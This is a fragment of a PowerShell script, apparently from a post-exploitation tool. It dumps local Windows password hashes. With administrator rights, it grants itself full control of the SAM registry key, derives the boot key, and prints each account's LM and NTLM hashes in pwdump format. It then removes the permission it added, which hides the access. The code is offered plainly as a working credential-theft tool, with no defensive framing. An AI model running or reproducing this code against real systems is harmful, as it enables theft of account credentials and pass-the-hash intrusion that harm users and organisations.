    function Get-UserKeys
    {
        ls HKLM:\SAM\SAM\Domains\Account\Users |
            where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
                Add-Member AliasProperty KeyName PSChildName -PassThru |
                Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
                Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
    }

    function DumpHashes
    {
        LoadApi
        $bootkey = Get-BootKey;
        $hbootKey = Get-HBootKey $bootkey;
        Get-UserKeys | %{
            $hashes = Get-UserHashes $_ $hBootKey;
            if($PSObjectFormat)
            {
                $creds = New-Object psobject
                $creds | Add-Member -MemberType NoteProperty -Name Name -Value $_.Username
                $creds | Add-Member -MemberType NoteProperty -Name id -Value $_.Rid
                $creds | Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString($hashes[0])).Replace("-","").ToLower()
                $creds | Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString($hashes[1])).Replace("-","").ToLower()
                $creds
            }
            else
            {
                "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
                [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
                [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
            }
        }
    }

    if(-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Warning "Script requires elevated or administrative privileges."
        Return
    } 

    else
    {
        #Set permissions for the current user.
        $rule = New-Object System.Security.AccessControl.RegistryAccessRule (
            [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,
            "FullControl",
            [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit",
            [System.Security.AccessControl.PropagationFlags]"None",
            [System.Security.AccessControl.AccessControlType]"Allow")
        
        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
            "SAM\SAM\Domains",
            [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
            [System.Security.AccessControl.RegistryRights]::ChangePermissions)
        
        $acl = $key.GetAccessControl()
        
        $acl.SetAccessRule($rule)
        
        $key.SetAccessControl($acl)

        DumpHashes

        #Remove the permissions added above.
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        $acl.Access | where {$_.IdentityReference.Value -eq $user} | %{$acl.RemoveAccessRule($_)} | Out-Null
        Set-Acl HKLM:\SAM\SAM\Domains $acl
    }